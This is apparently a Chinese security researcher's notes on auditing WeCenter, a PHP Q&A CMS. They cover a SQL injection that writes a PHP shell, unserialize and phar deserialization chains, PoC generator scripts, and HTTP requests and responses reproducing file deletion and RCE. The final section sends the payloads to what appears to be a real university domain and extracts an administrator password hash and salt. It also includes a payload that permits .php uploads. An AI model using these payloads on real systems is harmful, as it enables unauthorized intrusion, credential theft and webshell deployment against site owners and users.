---
title: "WeCenter代码审计"
slug: xqnabk
translationKey: xqnabk
date: 2020-03-24T17:55:09+08:00
source: yuque/penetration
---

[此处为语雀卡片，点击链接查看](https://www.yuque.com/docs/5555418#Fx13J)



## WeCenter代码审计
> 针对[WeCenter 3.0.1](http://www.wecenter.com/?copyright)的老版本作代码审计，~~顺便搞某台~~`~~wecenter~~`~~机器（~~学下mvc架构）
>

### 概览
+ 全局的防注入函数，没毛病。不过假如数据库编码为`gbk`时，可用宽字节搞一波

> 用了`mysql_real_escape_string`，我们需要在执行sql语句之前调用一下mysql_set_charset函数，设置当前连接的字符集为gbk。否则仍然不能抵御宽字符注入。
>

```php
# /system/aws_model.inc.php->quote
/** /system/aws_model.inc.php#997  */
<?php
....
	/**
	 * 添加引号防止数据库攻击
	 *
	 * 外部提交的数据需要使用此方法进行清理
	 *
	 * @param	string
	 * @return	string
	 */
	public function ($string)
	{
		if (is_object($this->db()))
		{
			$_quote = $this->db()->quote($string);

			if (substr($_quote, 0, 1) == "'")//去掉首位的引号
			{
				$_quote = substr(substr($_quote, 1), 0, -1);
			}

			return $_quote;
		}

		if (function_exists('mysql_escape_string'))
      //This function was deprecated in PHP 4.3.0, 被废弃
		{
			$string = @mysql_escape_string($string);
		}
		else
		{
			$string = addslashes($string);
		}

		return $string;
	}

```



+ cookie前面的三个字母前缀`G_COOKIE_PREFIX`，其实是cms自动生成的随机盐, 理论上这个值在不同的网站中必然不同

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1585049138753-ee528653-a14c-4506-a79c-300781b81dfb.png)

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1585049049717-c93b6c34-8ccc-4c94-a8bd-5024b0fc7bb0.png)

### 框架扫描1：gaudit
采用这套名为`[gaduit](https://github.com/wireghoul/graudit/)`的框架，对源代码进行静态扫描，排除了`js`和`sql`文件

```shell
root@localhost:/opt/graudit# 
./graudit -A  -x *.js,*.sql ~/downloads/wecenter-3.0.1/  
```



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1585205147715-f0bb8ebc-2bef-4a62-8e41-6e9a89dde08c.png)

跟进漏洞报告分析，发现以下问题

### 0x01 /app/topic/ajax.php #70 topic_id参数sql注入


```powershell
public function question_list_action()
	{
		if ($_GET['feature_id'])
		{
			if ($topic_ids = $this->model('feature')->get_topics_by_feature_id($_GET['feature_id']))
			{
				$_GET['topic_id'] = implode(',', $topic_ids);
			}
		}

		switch ($_GET['type'])
		{
			case 'best':
				$action_list = $this->model('topic')->get_topic_best_answer_action_list($_GET['topic_id'], $this->user_id, intval($_GET['page']) * get_setting('contents_per_page') . ', ' . get_setting('contents_per_page'));
			break;

```

问题就出在`   	$action_list = $this->model('topic')->get_topic_best_answer_action_list($_GET['topic_id'], $this->user_id, intval($_GET['page']) * get_setting('contents_per_page') . ', ' . get_setting('contents_per_page'));  `

直接将`$_GET['topic_id']`传入了`get_topic_best_answer_action_list`函数，跟进`get_topic_best_answer_action_list`



发现只对`$topic_id`进行了打散、合并的操作，相当于什么事情都没做，更不要说对`sql`语句进行过滤了

ref:[漏洞标题： WeCenter SQL注射（ROOT SHELL）](https://wooyun.website/show.php?uid=nbJcKdMjd80Eitu5UkVFyMgW09KjlKJr1LPRPBtC)



```http
/?/topic/ajax/question_list/type-best&topic_id=1) union select '<?php phpinfo();?>' into outfile 'C:/shell.php'#
```

### 框架扫描2：seay代码审计系统
### 0x02 /app/m/weixin.php #115 反序列化导致sql执行
参考了奶权师傅[这篇文章](https://xz.aliyun.com/t/7077)里的叙述，对整个过程进行下分析

> 由于SQL语句的执行发生在析构函数__destruct()中，并且_shutdown_query没有被静态关键词static修饰。于是很自然可以想到利用反序列化的方式，重置$this->_shutdown_query的值。
>



首先`/app/m/weixin.php #115`存在可控的反序列化点。ps:反序列化会将字符串转换为对象。对象被创建时，会自动调用构造函数`__construct`；而对象被销毁时（如程序运行结束），会自动调用析构函数`__destruct`

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1585376277328-09266122-923a-49bc-8dc8-151b08993e65.png)



那么我们找找能利用的析构函数，`/system/aws_model.inc.php`中，`query`函数对`_shutdown_query`变量进行了遍历，跟进`query`函数

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1585376834580-2d28ba94-7f43-4466-ab3f-74d06e53f029.png)

`query`函数对`$sql`未加过滤，直接带入数据库中执行

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1585377970543-c135e76a-40cb-4865-adac-4ab0066e700e.png)

因为没对`_shutdown_query`变量使用`static`修饰符进行修饰，因此`_shutdown_query`变量可以被我们控制

所以这就直接导致了任意`sql`代码的执行

构造payload的代码如下

```php
<?php
class AWS_MODEL{
    private $_shutdown_query = array();

    public function __construct(){
        $this->_shutdown_query['test'] = 'SELECT UPDATEXML(1, concat(0xa, user(), 0xa), 1)';
    }
}
echo base64_encode(serialize(new AWS_MODEL));
?>
```



> 
>

具体利用，看这段乌云上的`payload`，报错注入

```http
/?/m/weixin/authorization/&state=OAUTH&access_token=YToyOntzOjc6ImVycmNvZGUiO2k6MTtpOjA7Tzo5OiJBV1NfTU9ERUwiOjE6e3M6MjY6IgBBV1NfTU9ERUwAX3NodXRkb3duX3F1ZXJ5IjthOjE6e2k6MDtzOjQwOiJTRUxFQ1QgdXBkYXRleG1sKDEsY29uY2F0KDB4YSx1c2VyKCkpLDEpIjt9fX0%3D

//响应
Database error ------ SQL: SELECT updatexml(1,concat(0xa,user()),1) Error Message: Mysqli prepare error: XPATH syntax error: ' root@localhost'
```



## WeCenter漏洞复现
> app="WeCenter" &&   body="WeCenter 3.3.4"
>

以下漏洞均针对`WeCenter 3.3.4`版本

### 配置条件
**关闭**`**phar.readonly**`

```shell
php --ri Phar
```



查看`phar`的设置，要求关闭`phar.readonly`, 在`php.ini`中关闭并重启`apache`即可

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1584804733344-37f890d0-1bc9-4a40-8e7d-97b860644aac.png)

### 任意文件删除复现过程
`system/Zend/Http/Response/Stream.php:__destruct() `方法中存在任意文件删除。

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1585383942474-3f02ad6a-7dda-4d70-a9b7-292d1887a6e6.png)

```php
<?php
class Zend_Http_Response_Stream
{
    protected $_cleanup;
    protected $stream_name;

    public function __construct($stream_name)
    {
        $this->_cleanup = true;
        $this->stream_name = $stream_name;
    }
}

$stream_name = '/var/www/html/wecenter334/shell.php';
$evilobj = new Zend_Http_Response_Stream($stream_name);
// phar.readonly无法通过该语句进行设置: init_set("phar.readonly",0);
$filename = 'poc.phar';// 后缀必须为phar，否则程序无法运行
file_exists($filename) ? unlink($filename) : null;
$phar=new Phar($filename);
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($evilobj);
$phar->addFromString("foo.txt","bar");
$phar->stopBuffering();

?>
```

ref：[WeCenter3.3.4前台SQL注入&任意文件删除&RCE - WEB代码审计(Scripts Security) - T00LS | 低调求发展 - 潜心习安全](https://www.t00ls.net/thread-54797-1-1.html)

### RCE复现过程
[PHP反序列笔记](https://www.yuque.com/henry-weply/kb/tdk0qr#zv6cB)



+ 注册账号  
略。。
+ 生成Phar文件

```php
//PoC
<?php
class AWS_MODEL{
        private $_shutdown_query = array();

        public function __construct(){
            $this->_shutdown_query['test'] = "SELECT UPDATEXML(1, concat(0xa, user(), 0xa), 1)";
        }
}
$a = new AWS_MODEL;
$phar = new Phar("2.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."__HALT_COMPILER();");
$phar->setMetadata($a);
$phar->addFromString("test.txt","123");
$phar->stopBuffering();
rename("2.phar","shell.gif");
?>
```

#### 上传图片payload
在编辑器里上传上面生成的gif图片，记下返回的url，如下所示

```json
{"uploaded":1,"fileName":"shell.gif","url":"\/uploads\/question\/20200322\/5594439edbe52727eb65d0dff1d0a8c2.gi
```

#### 构造恶意反序列化
生成并设置`COOKIE`中的`WXConnect`值, 将你的`username`和`headimgurl`替换到下面

```php
//generate cookie
<?php
    $arr = array();
    $arr['access_token'] = array('openid' => '1');
    $arr['access_user'] = array();
    $arr['access_user']['openid'] = 1;
    $arr['access_user']['nickname'] = 'mnbv';//mnbv
    $arr['access_user']['headimgurl'] = 'phar://uploads/question/20200322/5594439edbe52727eb65d0dff1d0a8c2.gif';
    echo json_encode($arr);
?>

```

先发绑定微信的请求

```json
GET /?/m/weixin/binding/ HTTP/1.1

(添加Cookie:注意__WXConnect记得替换成实际的值)
__WXConnect={"access_token":{"openid":"1"},"access_user":{"openid":1,"nickname":"mnbv","headimgurl":"phar:\/\/uploads\/question\/20200322\/5594439edbe52727eb65d0dff1d0a8c2.gif"}}
```



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1584807542521-bccdc2ef-1588-4da8-ab69-9773241c5c53.png)

提示绑定成功后，再同步一下



```json
GET /?/account/ajax/synch_img/ HTTP/1.1

(添加Cookie:注意__WXConnect记得替换成实际的值)

__WXConnect={"access_token":{"openid":"1"},"access_user":{"openid":1,"nickname":"mnbv","headimgurl":"phar:\/\/uploads\/question\/20200322\/5594439edbe52727eb65d0dff1d0a8c2.gif"}}
```



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1584807852538-64e455b8-8cf8-4b87-8efa-edf1fa164566.png)

成功的响应

```http
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Sun, 22 Mar 2020 15:20:21 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: PHP/7.3.5
Expires: Mon, 26 Jul 1997 05:00:00 GMT
Last-Modified: Sun, 22 Mar 2020 15:20:21 GMT
Cache-Control: no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: vou__WXConnect=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/; HttpOnly
Content-Length: 2096

//微信绑定成功
```



 失败1-数据库结构不同（可能是wecenter版本不同）



```http
HTTP/1.1 500 Internal Server Error
Server: nginx/1.14.2
Date: Sun, 22 Mar 2020 15:20:23 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: PHP/7.3.5
Expires: Mon, 26 Jul 1997 05:00:00 GMT
Last-Modified: Sun, 22 Mar 2020 15:20:23 GMT
Cache-Control: no-cache, must-revalidate
Pragma: no-cache
Content-Length: 266

Database error
------

SQL: UPDATE `aws_system_setting` SET `value` = 's:45:&quot;jpg,jpeg,png,gif,zip,doc,docx,rar,pdf,psd,php&quot;;' WHERE (`varname` = 'allowed_upload_types')

Error Message: Mysqli prepare error: Table 'wecenter.aws_system_setting' doesn't exist
```



失败2-格式不匹配



```http
HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Sun, 22 Mar 2020 15:06:58 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.1.33
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 62

{"error":1,"msg":"\u6587\u4ef6\u7c7b\u578b\u4e0d\u7b26\u5408"}
```



### 漏洞修复
删除`app/account/ajax.php`下名为`synch_img`的`action`即可，删除路由或者函数都可以

## 
## 后记
### `phar`反序列化
`phar`反序列化

`受影响函数($v)` 在`$v`可控的情况下 传入`phar`伪协议解析的文件即可完成反序列化

受影响函数列表：

![](https://cdn.nlark.com/yuque/0/2020/jpeg/166008/1585379652627-71c34c9d-0dc0-4211-bb5d-8862d6b6656f.jpeg)

```http
正则
(fileatime|filectime|file_exists|file_get_contents|file_put_contents|file|filegroup|fopen|fileinode|filemtime|fileowner|fileperms|is_dir|is_executable|is_file|is_link|is_readable|is_writable|is_writeable|parse_ini_file|copy|unlink|stat|readfile)\((.*?)\$(.*?)\)

```

> 
>

```php
<?php
class AWS_MODEL {
    private $_shutdown_query;
    function __construct()
    {
        $this->_shutdown_query = [
            "UPDATE `aws_system_setting` SET `value` = 's:45:\"jpg,jpeg,png,gif,zip,doc,docx,rar,pdf,psd,php\";' WHERE (`varname` = 'allowed_upload_types')"
        ];
    }
}
$arr = [
    'errcode' => 1,
    new AWS_MODEL()
];
echo urlencode(base64_encode(serialize($arr)));
?>
```



```sql
# 拓展
UPDATE `aws_system_setting` SET `value` = 's:45:\"jpg,jpeg,png,gif,zip,doc,docx,rar,pdf,psd,php\";' WHERE (`varname` = 'allowed_upload_types')

wen.sntcm.edu.cn//?/m/weixin/authorization/&state=OAUTH&access_token=YToyOntzOjc6ImVycmNvZGUiO2k6MTtpOjA7Tzo5OiJBV1NfTU9ERUwiOjE6e3M6MjY6IgBBV1NfTU9ERUwAX3NodXRkb3duX3F1ZXJ5IjthOjE6e2k6MDtzOjQwOiJTRUxFQ1QgdXBkYXRleG1sKDEsY29uY2F0KDB4YSx1c2VyKCkpLDEpIjt9fX0%3D


# payload
#             "select 1 from(select count(*),concat((select concat(password,0x23,salt,0x23) from aws_users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a#"

wen.sntcm.edu.cn//?/m/weixin/authorization/&state=OAUTH&access_token=YToyOntzOjc6ImVycmNvZGUiO2k6MTtpOjA7Tzo5OiJBV1NfTU9ERUwiOjE6e3M6MjY6IgBBV1NfTU9ERUwAX3NodXRkb3duX3F1ZXJ5IjthOjE6e2k6MDtzOjE2Njoic2VsZWN0IDEgZnJvbShzZWxlY3QgY291bnQoKiksY29uY2F0KChzZWxlY3QgY29uY2F0KHBhc3N3b3JkLDB4MjMsc2FsdCwweDIzKSBmcm9tIGF3c191c2VycyBsaW1pdCAwLDEpLGZsb29yKHJhbmQoMCkqMikpeCBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgZ3JvdXAgYnkgeClhIyI7fX19


Database error ------ SQL: select 1 from(select count(*),concat((select concat(password,0x23,salt,0x23) from aws_users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a# Error Message: Mysqli statement execute error : Duplicate entry '2bc37032aa4801a8e95d42e9dd70a4da#mvsh#1' for key 'group_key'
```





## reference
+ [ wecenter top_id sql注入漏洞（20160428） ](http://wenda.wecenter.com/question/30228)
+ [某Center v3.3.4 从前台反序列化任意SQL语句执行到前台RCE](https://xz.aliyun.com/t/7077)

